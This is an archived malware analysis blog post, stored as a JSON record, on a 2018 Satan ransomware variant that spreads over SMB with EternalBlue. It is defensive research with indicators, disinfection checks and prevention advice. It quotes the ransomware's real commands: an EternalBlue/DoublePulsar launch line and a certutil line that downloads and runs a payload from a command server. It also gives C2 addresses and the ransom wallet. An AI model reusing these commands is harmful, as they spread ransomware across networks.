{
    "id": "0b6bf6ec-3657-4101-8734-db6e9252db6f",
    "created_at": "2023-01-12T15:08:18.151051Z",
    "updated_at": "2025-03-27T02:05:39.518326Z",
    "deleted_at": null,
    "sha1_hash": "8be73ba840c327da4b5b7cc9478a0c95176853c5",
    "title": "2018-04-22 - Satan ransomware adds EternalBlue exploit",
    "authors": "",
    "file_creation_date": "2022-05-27T21:15:49Z",
    "file_modification_date": "2022-05-27T21:15:49Z",
    "file_size": 382439,
    "plain_text": "# Satan ransomware adds EternalBlue exploit\n\n**[bartblaze.blogspot.com/2018/04/satan-ransomware-adds-eternalblue.html](https://bartblaze.blogspot.com/2018/04/satan-ransomware-adds-eternalblue.html)**\n\nToday, [MalwareHunterTeam reached out to me about a possible new variant of Satan ransomware.](https://twitter.com/malwrhunterteam)\n\n[Satan ransomware itself has been around since January 2017 as reported by Bleeping Computer.](https://www.bleepingcomputer.com/news/security/new-satan-ransomware-available-through-a-ransomware-as-a-service-/)\n\nIn this blog post we'll analyse a new version of the infamous Satan ransomware, which since November 2017 has\nbeen using the EternalBlue exploit to spread via the network, and consequently encrypt files.\n\n**Analysis**\n\nFirst up is a file inconspicuously named \"sts.exe\", which may refer to \"Satan spreader\".\n\n**MD5: 12bc52fd9da66db3e63bfb196ceb9be6**\n**SHA1: 4508e3442673c149b31e3fffc29cc95f834975bc**\n**SHA256: b686cba1894f8ab5cec0ce5db195022def00204f6cd143a325608ec93e8b74ee**\n**Compilation timestamp: 2018-04-14 06:33:08**\n**VirusTotal report:**\n\n[b686cba1894f8ab5cec0ce5db195022def00204f6cd143a325608ec93e8b74ee](https://www.virustotal.com/en/file/b686cba1894f8ab5cec0ce5db195022def00204f6cd143a325608ec93e8b74ee/analysis/)\n\nThe file is packed with PECompact 2, and is therefore only 30KB in filesize.\n\nNotably, Satan has used different packers in multiple campaigns, for example, it has also used UPX and WinUpack.\nThis is possibly due to a packer option in the Satan RaaS builder. Fun fact: [Iron ransomware, which may be a spin-](https://bartblaze.blogspot.co.uk/2018/04/maktub-ransomware-possibly-rebranded-as.html)\noff from Satan, has used VMProtect.\n\n\"sts.exe\" acts as a simple downloader, and will download two new files, both SFX archives, and extract them with a\ngiven password:\n\nFigure 1 - download and extract two new files\n\nBoth files will be downloaded from 198.55.107[.]149, and use a custom User-Agent \"RookIE/1.0\", which seems a\nrather unique User-Agent.\n\nms.exe has password: iamsatancryptor\nclient.exe has password: abcdefghijklmn\n\n\n-----\n\nIt appears the Satan ransomware developers showcase some sense of humor by using the password\n\"iamsatancryptor\".\n\nOnce the user has executed \"sts.exe\", they will get the following UAC prompt, if enabled:\n\nFigure 2 - UAC prompt\n\nClient.exe (94868520b220d57ec9df605839128c9b) is, as mentioned earlier, an SFX archive and will hold the actual\nSatan ransomware, named \"Cryptor.exe\". Figure 2 shows the command line options.\n\nCuriously, and thanks to the s2 option, the start dialog will be hidden, but the extraction progress is displayed - this\nmeans we need to click through to install the ransomware. Even more curious: the setup is in Chinese.\n\nFigure 3 - End of setup screen\n\nms.exe (770ddc649b8784989eed4cee10e8aa04) on the other hand will drop and load the EternalBlue exploit, and\nstarts scanning for vulnerable hosts. Required files will be dropped in the C:\\ProgramData folder, as seen in Figure\n3. Note it uses a publicly available implementation of the exploit - it does not appear to use its own.\n\nThe infection of other machines on the network will be achieved with the following command:\n\n\n-----\n\n_cmd /c cd /D C:\\Users\\Alluse 1\\&blue.exe TargetIp & star.exe OutConfig a TargetPort 445 Protocol SMB_\n_--Architecture x64 --Function RunDLL --DllPayload down64.dll --TargetIp_\n\nWe can then see an attempt to spread the ransomware to other machine in the same network:\n\nFigure 4 - Spreading attempt over SMB, port 445\n\ndown64.dll (17f8d5aff617bb729fcc79be322fcb67) will be loaded in memory using DoublePulsar, and executes the\nfollowing command:\n\n_cmd.exe /c certutil.exe -urlcache -split -f http://198.55.107.149/cab/sts.exe c:/sts.exe&c:\\sts.exe_\n\nThis will be used for planting sts.exe on other machines in the network, and will consequently be executed.\n\nSatan ransomware itself, which is contained in Client.exe, will be dropped to C:\\Cryptor.exe.\n\nThis payload is also packed with PECompact 2. As usual, any database-related services and processes will be\nstopped and killed, which it does to also encrypt those files possibly in use by another process.\n\nFigure 5 - Database-related processes\n\nWhat's new in this version of Satan, is that the exclusion list has changed slightly - it will not encrypt files with the\nfollowing words in its path:\n\n\n-----\n\n_windows, python2, python3, microsoft games, boot, i386, ST_V22, intel, dvd maker, recycle, libs, all users,_\n_360rec, 360sec, 360sand, favorites, common files, internet explorer, msbuild, public, 360downloads, windows_\n_defen, windows mail, windows media pl, windows nt, windows photo viewer, windows sidebar, default user_\n\n[This exclusion list is reminiscent of Iron ransomware. (or vice-versa)](https://bartblaze.blogspot.co.uk/2018/04/maktub-ransomware-possibly-rebranded-as.html)\n\nSatan will, after encryption, automatically open the following ransomware note: C:\\_How_to_decrypt_files.txt:\n\nFigure 6 - Ransom note\n\nThe note is, as usual, in English, Chinese and Korean, and demands the user to pay 0.3 BTC. Satan will prepend\nfilenames with its email address, satan_pro@mail.ru, and append extensions with .satan. For\nexample: [satan_pro@mail.ru]Desert.jpg.satan\n\nBTC Wallet: 14hCK6iRXwRkmBFRKG8kiSpCSpKmqtH2qo\nEmail: satan_pro@mail.ru\nNote: _How_to_decrypt_files.txt\n\nIt appears one person has already paid 0.2 BTC:\n[https://blockchain.info/address/14hCK6iRXwRkmBFRKG8kiSpCSpKmqtH2qo](https://blockchain.info/address/14hCK6iRXwRkmBFRKG8kiSpCSpKmqtH2qo)\n\nSatan will create a unique mutex, SATANAPP, so the ransomware won't run twice. It will also generate a unique\nhardware ID and sends this to the C2 server:\n\n_GET /data/token.php?_\n_status=ST&code=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX_\n\n_HTTP/1.1_\n\n_Connection: Keep-Alive_\n\n_User-Agent: Winnet Client_\n\n_Host: 198.55.107.149_\n\n\n-----\n\nAs mentioned in the beginning of this blog post, Satan ransomware has been using EternalBlue since at least\nNovember 2017 last year. For example, 25005f06e9b45fad836641b19b96f4b3 is another downloader which works\nsimilar to what is posted in this blog. It would fetch the following files:\n\nhttp://122.114.9.220/data/client.exe\nhttp://122.114.9.220/data/ms.exe\nhttp://122.114.9.220/data/winlog.exe\n\nAccording to VirusTotal, the downloader file was uploaded:\n**2017-11-20 18:35:17 UTC ( 5 months ago )**\n\n[For additional reading, read this excellent post by Tencent, who discovered a similar variant using EternalBlue earlier](https://s.tencent.com/research/report/455.html)\nin April this year.\n\n**Disinfection**\n\nYou may want to verify if any of the following files or folders exist:\n\nC:\\sts.exe\nC:\\Cryptor.exe\nC:\\ProgramData\\ms.exe\nC:\\ProgramData\\client.exe\nC:\\Windows\\Temp\\KSession\n\n**Prevention**\n\nEnable UAC\n[Enable Windows Update, and install updates (especially verify if MS17-010 is installed)](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)\nInstall an antivirus, and keep it up-to-date and running\nRestrict, where possible, access to shares (ACLs)\nCreate backups! (and test them)\n\n[More ransomware prevention can be found here.](https://bartblaze.blogspot.co.uk/p/ransomware-prevention.html)\n\n**Conclusion**\n\nSatan is not the first ransomware to use EternalBlue (for example, WannaCry), however, it does appear the\ndevelopers of Satan are continuously improving and adding features to its ransomware.\n\nPrevention is always better than disinfection/decryption.\n\n**IOCs**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-04-22 - Satan ransomware adds EternalBlue exploit.pdf"
    ],
    "report_names": [
        "2018-04-22 - Satan ransomware adds EternalBlue exploit.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536098,
    "ts_updated_at": 1743041139,
    "ts_creation_date": 1653686149,
    "ts_modification_date": 1653686149,
    "files": {
        "pdf": "https://archive.orkl.eu/8be73ba840c327da4b5b7cc9478a0c95176853c5.pdf",
        "text": "https://archive.orkl.eu/8be73ba840c327da4b5b7cc9478a0c95176853c5.txt",
        "img": "https://archive.orkl.eu/8be73ba840c327da4b5b7cc9478a0c95176853c5.jpg"
    }
}